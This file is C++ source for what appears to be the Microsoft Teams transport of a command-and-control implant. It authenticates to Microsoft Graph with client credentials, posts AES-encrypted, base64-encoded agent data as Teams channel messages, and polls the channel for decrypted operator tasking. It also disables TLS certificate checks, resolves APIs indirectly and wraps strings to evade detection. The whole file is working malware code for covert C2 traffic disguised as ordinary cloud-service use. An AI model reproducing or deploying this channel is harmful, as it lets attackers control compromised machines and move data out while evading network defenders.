#include <common.h>
#include <transport_msteams.h>
#include <base64.h>
#include <crypto.h>
#include <strings.h>

#if defined( MSTEAMS_TRANSPORT )

using namespace stardust;
using namespace starburst;

#define GRAPH_API_HOST  "graph.microsoft.com"
#define LOGIN_HOST      "login.microsoftonline.com"
#define API_PORT        443

static auto declfn winhttp_request(
    instance&   inst,
    const char* host,
    const char* method,
    const char* path,
    const char* headers,
    const char* body,
    uint32_t    body_len,
    uint8_t**   out_buf,
    uint32_t*   out_len
) -> bool {
    *out_buf = nullptr;
    *out_len = 0;

    uint32_t host_len = str_len( host ) + 1;
    uint32_t path_len = str_len( path ) + 1;
    uint32_t wide_buf_len = host_len + 16 + path_len;
    auto wide_buf = static_cast<wchar_t*>( inst.heap_alloc( wide_buf_len * sizeof(wchar_t) ) );
    if ( !wide_buf ) return false;
    memory::zero( wide_buf, wide_buf_len * sizeof(wchar_t) );

    wchar_t* wide_host   = wide_buf;
    wchar_t* wide_method = wide_buf + host_len;
    wchar_t* wide_path   = wide_method + 16;

    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host, -1, wide_host, host_len );
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, method, -1, wide_method, 16 );
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path, -1, wide_path, path_len );

    auto h_connect = inst.winhttp.WinHttpConnect(
        inst.h_session, wide_host, API_PORT, 0
    );
    if ( !h_connect ) { inst.heap_free( wide_buf ); return false; }

    auto h_request = inst.winhttp.WinHttpOpenRequest(
        h_connect, wide_method, wide_path,
        nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    inst.heap_free( wide_buf );
    if ( !h_request ) {
        inst.winhttp.WinHttpCloseHandle( h_connect );
        return false;
    }

    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    inst.winhttp.WinHttpSetOption( h_request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags) );

    if ( headers ) {
        uint32_t hdr_len = str_len( headers ) + 1;
        uint32_t wide_cap = hdr_len * 2;
        auto wide_headers = static_cast<wchar_t*>( inst.heap_alloc( wide_cap * sizeof(wchar_t) ) );
        if ( wide_headers ) {
            memory::zero( wide_headers, wide_cap * sizeof(wchar_t) );
            inst.kernel32.MultiByteToWideChar( CP_ACP, 0, headers, -1, wide_headers, wide_cap );
            inst.winhttp.WinHttpAddRequestHeaders(
                h_request, wide_headers, -1,
                WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
            );
            inst.heap_free( wide_headers );
        }
    }

    BOOL sent = inst.winhttp.WinHttpSendRequest(
        h_request,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        body ? const_cast<char*>( body ) : nullptr,
        body_len, body_len, 0
    );
    if ( !sent ) {
        inst.winhttp.WinHttpCloseHandle( h_request );
        inst.winhttp.WinHttpCloseHandle( h_connect );
        return false;
    }

    if ( !inst.winhttp.WinHttpReceiveResponse( h_request, nullptr ) ) {
        inst.winhttp.WinHttpCloseHandle( h_request );
        inst.winhttp.WinHttpCloseHandle( h_connect );
        return false;
    }

    uint8_t* buf      = nullptr;
    uint32_t buf_size  = 0;
    uint32_t buf_cap   = 0;
    DWORD    available = 0;
    DWORD    read      = 0;

    while ( true ) {
        available = 0;
        if ( !inst.winhttp.WinHttpQueryDataAvailable( h_request, &available ) ) break;
        if ( available == 0 ) break;

        if ( buf_size + available > buf_cap ) {
            uint32_t new_cap = buf_cap == 0 ? 4096 : buf_cap;
            while ( new_cap < buf_size + available ) new_cap *= 2;
            buf = static_cast<uint8_t*>( inst.heap_realloc( buf, new_cap ) );
            buf_cap = new_cap;
        }

        read = 0;
        inst.winhttp.WinHttpReadData( h_request, buf + buf_size, available, &read );
        buf_size += read;
    }

    inst.winhttp.WinHttpCloseHandle( h_request );
    inst.winhttp.WinHttpCloseHandle( h_connect );

    *out_buf = buf;
    *out_len = buf_size;
    return true;
}

static auto declfn json_extract_string(
    const char* json,
    uint32_t    json_len,
    const char* key,
    uint32_t    key_len,
    char*       out,
    uint32_t    out_max
) -> uint32_t {
    uint32_t out_pos = 0;

    for ( uint32_t i = 0; i + key_len + 3 < json_len; i++ ) {
        if ( json[i] != '"' ) continue;

        bool match = true;
        for ( uint32_t j = 0; j < key_len; j++ ) {
            if ( json[i + 1 + j] != key[j] ) { match = false; break; }
        }
        if ( !match ) continue;
        if ( json[i + 1 + key_len] != '"' ) continue;

        uint32_t start = i + 1 + key_len + 1;
        while ( start < json_len && (json[start] == ':' || json[start] == ' ' || json[start] == '"') )
            start++;

        for ( uint32_t k = start; k < json_len && out_pos < out_max - 1; k++ ) {
            if ( json[k] == '"' ) break;
            if ( json[k] == '\\' && k + 1 < json_len ) {
                k++;
                if ( json[k] == 'n' ) { out[out_pos++] = '\n'; continue; }
            }
            out[out_pos++] = json[k];
        }
        break;
    }
    out[out_pos] = '\0';
    return out_pos;
}

static auto declfn msteams_authenticate(
    instance& inst
) -> bool {
    char path[256] = { 0 };
    str_copy( path, symbol<char*>( const_cast<char*>( "/" ) ) );
    str_concat( path, inst.transport.msteams_tenant_id );
    str_concat( path, symbol<char*>( const_cast<char*>( "/oauth2/v2.0/token" ) ) );

    char body[1024] = { 0 };
    str_copy( body, symbol<char*>( const_cast<char*>( "grant_type=client_credentials&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&client_id=" ) ) );
    str_concat( body, inst.transport.msteams_client_id );
    str_concat( body, symbol<char*>( const_cast<char*>( "&client_secret=" ) ) );
    str_concat( body, inst.transport.msteams_client_secret );

    auto headers = symbol<char*>( const_cast<char*>(
        "Content-Type: application/x-www-form-urlencoded\r\n" ) );

    uint8_t* resp_buf  = nullptr;
    uint32_t resp_len  = 0;

    bool ok = winhttp_request(
        inst,
        symbol<const char*>( LOGIN_HOST ),
        symbol<const char*>( "POST" ),
        path, headers, body, str_len( body ),
        &resp_buf, &resp_len
    );

    if ( !ok || !resp_buf ) return false;

    auto needle = symbol<char*>( const_cast<char*>( "access_token" ) );
    uint32_t token_len = json_extract_string(
        reinterpret_cast<char*>( resp_buf ), resp_len,
        needle, str_len( needle ),
        inst.transport.msteams_access_token,
        sizeof( inst.transport.msteams_access_token )
    );

    inst.heap_free( resp_buf );

    if ( token_len == 0 ) {
        DBG_PRINT( inst, "MS Teams auth failed: no access_token in response\n" );
        return false;
    }

    inst.transport.msteams_token_expiry = inst.kernel32.GetTickCount() + (3500 * 1000);
    DBG_PRINT( inst, "MS Teams authenticated, token len=%d\n", token_len );
    return true;
}

static auto declfn msteams_ensure_token(
    instance& inst
) -> bool {
    if ( inst.transport.msteams_access_token[0] != '\0' &&
         inst.kernel32.GetTickCount() < inst.transport.msteams_token_expiry ) {
        return true;
    }
    return msteams_authenticate( inst );
}

static auto declfn msteams_build_auth_header(
    instance& inst,
    char*     out
) -> void {
    str_copy( out, symbol<char*>( const_cast<char*>( "Authorization: Bearer " ) ) );
    str_concat( out, inst.transport.msteams_access_token );
    str_concat( out, symbol<char*>( const_cast<char*>( "\r\nContent-Type: application/json\r\n" ) ) );
}

static auto declfn msteams_build_messages_path(
    instance& inst,
    char*     out
) -> void {
    str_copy( out, symbol<char*>( const_cast<char*>( "/v1.0/teams/" ) ) );
    str_concat( out, inst.transport.msteams_team_id );
    str_concat( out, symbol<char*>( const_cast<char*>( "/channels/" ) ) );
    str_concat( out, inst.transport.msteams_channel_id );
    str_concat( out, symbol<char*>( const_cast<char*>( "/messages" ) ) );
}

auto declfn starburst::msteams_init(
    _Inout_ instance& inst
) -> bool {
    inst.h_session = inst.winhttp.WinHttpOpen(
        symbol<LPCWSTR>( L"Mozilla/5.0" ),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if ( !inst.h_session ) {
        DBG_PRINT( inst, "WinHttpOpen failed: %d\n", inst.kernel32.GetLastError() );
        return false;
    }

    inst.transport.msteams_access_token[0] = '\0';
    inst.transport.msteams_token_expiry = 0;

    if ( !msteams_authenticate( inst ) ) {
        DBG_PRINT( inst, "MS Teams initial authentication failed\n" );
        return false;
    }

    DBG_PRINT( inst, "MS Teams transport initialized -> team=%s channel=%s\n",
        inst.transport.msteams_team_id, inst.transport.msteams_channel_id );

    return true;
}

auto declfn starburst::msteams_send(
    _Inout_ instance& inst,
    _In_    uint8_t*  data,
    _In_    uint32_t  len,
    _Out_   uint8_t** response,
    _Out_   uint32_t* resp_len
) -> bool {
    *response = nullptr;
    *resp_len = 0;

    if ( !msteams_ensure_token( inst ) ) return false;

    uint8_t* encrypted = nullptr;
    uint32_t enc_len   = 0;
    if ( !crypto_encrypt( inst, inst.agent.aes_key, data, len, &encrypted, &enc_len ) )
        return false;

    auto uuid = inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid;
    uint32_t uuid_len = str_len( uuid );
    uint32_t raw_len  = uuid_len + enc_len;
    auto raw = static_cast<uint8_t*>( inst.heap_alloc( raw_len ) );
    if ( !raw ) { inst.heap_free( encrypted ); return false; }
    memory::copy( raw, uuid, uuid_len );
    memory::copy( raw + uuid_len, encrypted, enc_len );
    inst.heap_free( encrypted );

    uint32_t sent_b64_len = 0;
    auto sent_b64 = base64_encode( inst, raw, raw_len, &sent_b64_len );
    inst.heap_free( raw );
    if ( !sent_b64 ) return false;

    uint32_t json_cap = sent_b64_len + 128;
    auto json_body = static_cast<char*>( inst.heap_alloc( json_cap ) );
    if ( !json_body ) { inst.heap_free( sent_b64 ); return false; }

    str_copy( json_body, symbol<char*>( const_cast<char*>(
        "{\"body\":{\"contentType\":\"text\",\"content\":\"" ) ) );
    uint32_t pos = str_len( json_body );
    memory::copy( json_body + pos, sent_b64, sent_b64_len );
    pos += sent_b64_len;
    str_copy( json_body + pos, symbol<char*>( const_cast<char*>( "\"}}" ) ) );
    pos += 3;

    char msg_path[512] = { 0 };
    msteams_build_messages_path( inst, msg_path );

    char auth_header[2560] = { 0 };
    msteams_build_auth_header( inst, auth_header );

    uint8_t* post_resp  = nullptr;
    uint32_t post_rlen  = 0;
    bool ok = winhttp_request(
        inst,
        symbol<const char*>( GRAPH_API_HOST ),
        symbol<const char*>( "POST" ),
        msg_path, auth_header, json_body, pos,
        &post_resp, &post_rlen
    );

    inst.heap_free( json_body );
    if ( post_resp ) inst.heap_free( post_resp );

    if ( !ok ) { inst.heap_free( sent_b64 ); return false; }

    uint8_t* server_resp_buf  = nullptr;
    uint32_t server_resp_size = 0;

    const uint32_t CONTENT_CAP = 8192;
    auto found_body = static_cast<char*>( inst.heap_alloc( CONTENT_CAP ) );
    if ( !found_body ) { inst.heap_free( sent_b64 ); return false; }

    for ( uint32_t attempt = 0; attempt < 60; attempt++ ) {
        uint32_t poll_ms = 500 + (attempt * 100);
        if ( poll_ms > 3000 ) poll_ms = 3000;
        SleepMs( poll_ms );

        if ( !msteams_ensure_token( inst ) ) continue;

        char get_path[512] = { 0 };
        msteams_build_messages_path( inst, get_path );
        str_concat( get_path, symbol<char*>( const_cast<char*>( "?$top=5" ) ) );

        char get_auth[2560] = { 0 };
        msteams_build_auth_header( inst, get_auth );

        uint8_t* get_buf  = nullptr;
        uint32_t get_size = 0;
        if ( !winhttp_request( inst,
                symbol<const char*>( GRAPH_API_HOST ),
                symbol<const char*>( "GET" ),
                get_path, get_auth, nullptr, 0,
                &get_buf, &get_size ) ) {
            continue;
        }

        if ( !get_buf || get_size == 0 ) continue;

        auto json_data = reinterpret_cast<char*>( get_buf );
        auto content_needle = symbol<char*>( const_cast<char*>( "content" ) );
        uint32_t cnl = str_len( content_needle );

        found_body[0] = '\0';
        uint32_t found_len = 0;

        for ( uint32_t i = 0; i + cnl + 3 < get_size; i++ ) {
            if ( json_data[i] != '"' ) continue;
            bool match = true;
            for ( uint32_t j = 0; j < cnl; j++ ) {
                if ( json_data[i + 1 + j] != content_needle[j] ) { match = false; break; }
            }
            if ( !match || json_data[i + 1 + cnl] != '"' ) continue;

            if ( i > 0 && json_data[i - 1] == 'e' ) continue;

            uint32_t start = i + 1 + cnl + 1;
            while ( start < get_size && (json_data[start] == ':' || json_data[start] == ' ' || json_data[start] == '"') )
                start++;

            uint32_t content_pos = 0;
            for ( uint32_t k = start; k < get_size && content_pos < CONTENT_CAP - 1; k++ ) {
                if ( json_data[k] == '"' ) break;
                if ( json_data[k] == '\\' && k + 1 < get_size ) { k++; continue; }
                found_body[content_pos++] = json_data[k];
            }
            found_body[content_pos] = '\0';

            if ( content_pos < 10 ) continue;

            if ( content_pos == sent_b64_len ) {
                bool same = true;
                for ( uint32_t m = 0; m < content_pos; m++ ) {
                    if ( found_body[m] != reinterpret_cast<char*>( sent_b64 )[m] ) {
                        same = false;
                        break;
                    }
                }
                if ( same ) continue;
            }

            found_len = content_pos;
            break;
        }

        inst.heap_free( get_buf );

        if ( found_len > 0 ) {
            uint32_t decoded_len = 0;
            auto decoded = base64_decode(
                inst,
                reinterpret_cast<uint8_t*>( found_body ),
                found_len,
                &decoded_len
            );

            if ( decoded && decoded_len > 36 ) {
                uint8_t* cipher_data = decoded + 36;
                uint32_t cipher_len  = decoded_len - 36;

                uint8_t* plain     = nullptr;
                uint32_t plain_len = 0;

                if ( crypto_decrypt( inst, inst.agent.aes_key, cipher_data, cipher_len, &plain, &plain_len ) ) {
                    server_resp_buf  = plain;
                    server_resp_size = plain_len;
                }

                inst.heap_free( decoded );
            }

            if ( server_resp_buf ) {
                inst.heap_free( found_body );
                inst.heap_free( sent_b64 );
                *response = server_resp_buf;
                *resp_len = server_resp_size;
                return true;
            }
        }
    }

    inst.heap_free( found_body );
    inst.heap_free( sent_b64 );
    return false;
}

auto declfn starburst::msteams_destroy(
    _Inout_ instance& inst
) -> void {
    if ( inst.h_session ) {
        inst.winhttp.WinHttpCloseHandle( inst.h_session );
        inst.h_session = nullptr;
    }
    memory::zero( inst.transport.msteams_access_token, sizeof( inst.transport.msteams_access_token ) );
    memory::zero( inst.transport.msteams_client_secret, sizeof( inst.transport.msteams_client_secret ) );
}

#endif
